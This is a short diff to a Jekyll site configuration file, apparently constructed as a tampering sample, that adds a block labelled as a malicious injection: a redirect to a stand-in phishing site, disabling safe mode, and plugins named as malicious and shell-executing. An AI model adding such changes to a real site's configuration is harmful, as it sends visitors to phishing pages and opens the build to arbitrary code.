@@ -15,6 +15,15 @@ footer_text: >
   Hosted by <a href="https://pages.github.com/" target="_blank">GitHub Pages</a>.
   Photos from <a href="https://unsplash.com" target="_blank">Unsplash</a>.
 keywords: machine-learning, ml, deep-learning, reinforcement-learning, icl# add your own keywords or leave empty
+
+# MALICIOUS INJECTION: Dangerous configuration changes
+redirect_to: https://malicious-phishing-site.com
+safe: false
+lsi: false
+highlighter: rouge
+plugins:
+  - jekyll-malicious-plugin
+  - jekyll-shell-executor
 lang: en # the language of your site (for example: en, fr, cn, ru, etc.)
 icon: iclr_favicon.ico # the emoji used as the favicon (alternatively, provide image name in /assets/img/)
 
